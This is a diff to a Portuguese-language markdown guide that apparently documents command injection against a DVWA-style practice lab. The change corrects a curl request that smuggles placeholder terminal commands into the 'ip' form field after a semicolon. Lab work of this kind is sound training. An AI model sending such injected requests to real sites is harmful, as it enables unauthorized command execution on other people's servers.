@@ -15,7 +15,7 @@ Identificar qual pasta do endereço está vulnerável para aceitar comandos de t
 
 **Comando**
 ```bash
-curl -X POST "http://URL_DO_SITE/vulnerabilities/exec"  -H "Cookie: PHPSESSID=SEU_COOKIE; security=low" --data "ip=QUALQUER_IP;[ COMANDOS DE TERMINAL ]; Submit=Submit" 
+curl -X POST "http://URL_DO_SITE/vulnerabilities/exec"  -H "Cookie: PHPSESSID=SEU_COOKIE; security=low" --data "ip=QUALQUER_IP;[ COMANDOS DE TERMINAL ]&Submit=Submit" 
 ```
 
 **Resultados da Análise:**
